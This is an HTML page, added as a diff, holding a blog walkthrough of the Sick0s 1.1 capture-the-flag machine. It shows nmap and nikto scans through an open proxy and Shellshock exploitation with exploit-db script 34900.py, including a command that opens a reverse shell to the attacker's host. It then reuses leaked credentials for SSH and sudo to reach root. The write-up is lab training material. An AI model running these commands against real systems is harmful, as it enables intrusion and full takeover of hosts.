@@ -1,0 +1,123 @@
+<html>
+
+<head>
+    <title>Sick0s 1.1 Walkthrough</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="css/bootstrap.min.css" />
+    <link rel="stylesheet" href="css/bootstrap-social.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+</head>
+
+<body class="is-preload">
+
+    <!-- Main -->
+    <div id="main">
+        <nav class="navbar navbar-fixed-top navbar-dark bg-primary">
+            <ul class="nav navbar-nav mr-auto">
+                <li class="nav-item active">
+                    <a class="nav-link" href="index.html">home<span class="sr-only">(current)</span></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="index.html#projects">projects<span class="sr-only">(current)</span></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="index.html#resume">resume<span class="sr-only">(current)</span></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="index.html#about">about<span class="sr-only">(current)</span></a>
+                </li>
+                <a href="https://www.linkedin.com/in/oliver-haney-000/" class="btn btn-social-icon btn-linkedin">
+                    <span class="fa fa-linkedin"></span>
+                </a>
+                <a href="https://www.github.com/haney-oliver" class="btn btn-social-icon btn-github">
+                    <span class="fa fa-github"></span>
+                </a>
+            </ul>
+        </nav>
+        <div class="container articlecontainer">
+            <a class="anchor" id=mainAnchor></a>
+            <div class="page-header" id="banner">
+                <div class="row">
+                    <div class="col-lg-8 col-md-7 col-sm-6">
+                        <h1>Sick0s 1.1</h1>
+                        <p class="lead">Walkthrough</p>
+                    </div>
+                </div>
+            </div>
+            <div class=articlebody>
+                <p>In this CTF we are going to learn about command injection, using searchsploit, and privilege
+                    escalation.</p>
+                <p>The first thing we'll do is run a quick nmap scan, as I am still having trouble with netdiscover on
+                    NAT network. As we can see from the scan below, our host, <code class="language-sh">10.0.2.6</code>
+                    has ports 22, 3128, and 8080 exposed.</p>
+                <img src="images/sick1/sick1-1.png" class="sc">
+                <p>Good. We have identified the host, now for a more intense nmap scan. On port 3128 there looks to be
+                    an open HTTP proxy.</p>
+                <img src="images/sick1/sick1-2.png" class="sc">
+                <p>Let's configure our proxy settings in firefox...</p>
+                <img src="images/sick1/sick1-3.png" class="sc">
+                <p>...and navigate to the IP. BLEHHH!!!</p>
+                <img src="images/sick1/sick1-4.png" class="sc">
+                <p>Searching the source code revealed nothing, so we can look at the robots.txt for clues. It looks like
+                    there is a directory that the website owner wants discluded from search engine results, <code
+                        class="language-sh">/wolfcms</code>.</p>
+                <img src="images/sick1/sick1-5.png" class="sc">
+                <p>At this point I decided to try a dirb scan of the root directory, but that revealed nothing new.</p>
+                <img src="images/sick1/sick1-6.png" class="sc">
+                <p>Instead, let's try a dirb scan of the <code class="language-sh">/wolfcms</code> directory. This
+                    really doesn't net us anything of value, other than a confirmed 200 code on <code
+                        class="language-sh">/wolfcms/index.*</code>, so we can navigate there via the browser.</p>
+                <img src="images/sick1/sick1-7.png" class="sc">
+                <p>Here we see a web app called Wolf: Content Management Simplified. There is nothing significant here,
+                    and we really don't have a direction to move in, so let's run a nikto vulnerability scan.</p>
+                <img src="images/sick1/sick1-8.png" class="sc">
+                <p>The composition of the scan is as follows:</p>
+                <p><code class="language-sh">nikto -host 10.0.2.6 -useproxy 10.0.2.6:3128</code></p>
+                <p>And the results include the Shell Shock vulnerability listed below.</p>
+                <img src="images/sick1/sick1-9.png" class="sc">
+                <p>Using searchsploit, we are able to find a list of exploits that will allow us to create a reverse
+                    shell on the vulnerable host. In this case we are going to be using 34900.py.
+                    So, we can just copy the exploit into our working directory so we can edit it if necessary.
+                </p>
+                <p><code class="language-sh">cp /usr/share/exploitdb/exploits/linux/remote/34900.py 34900.py</code></p>
+                <img src="images/sick1/sick1-10.png" class="sc">
+                <p>By simply running the program, <code class="language-sh">python 34900.py</code> we can see exactly
+                    how to build our command.</br> </p>
+                <p><code
+                        class="language-sh">python 34900.py payload=reverse rhost=10.0.2.6/cgi-bin/status lhost=10.0.2.15 lport=1234 proxy=10.0.2.6:3128</code>
+                </p>
+                <p>Above is the command the complete command that we can use to establish a reverse shell.</p>
+                <img src="images/sick1/sick1-11.png" class="sc">
+                <p>And we're in!</p>
+                <img src="images/sick1/sick1-12.png" class="sc">
+                <p>Now, because of the increasing instability of my shell, I am going to take this as an opportunity to
+                    see if these credentials can be used elsewhere and log into the machine directly.
+                </p>
+                <p>The username and password combination, sickos john@123, works, and we are now logged in.</p>
+                <img src="images/sick1/sick1-13.png" class="sc">
+                <p>Then, we can attempt to reuse the password for sudo, and that works to! Finishing the CTF is as
+                    simple as <code class="language-sh">sudo su</code>, using john@123 as the password again, and
+                    navigating to the root directory. And there is the victory
+                    flag.
+                </p>
+                <img src="images/sick1/sick1-14.png" class="sc">
+                <p>There were many other ways that we could have gotten to root. During the initial exploitation phase,
+                    we could have used default admin credentials
+                    to log into the admin system and upload a reverse shell and gain access that way. Had I been able to
+                    secure a more stable shell in the first place,
+                    we could have used the <code class="language-sh">connect.py</code> file in the <code
+                        class="language-sh">/var/www/</code> directory. There we could have
+                    updated the file's contetnts to create a script that opens a reverse shell as root. For simple CTFs
+                    like this one, manual credential experimentation
+                    is a fine strategy, but nowadays you can expect people to use more secure credential practices.
+                    Anyway, that was a fun CTF and I hope you learned something.
+                </p>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
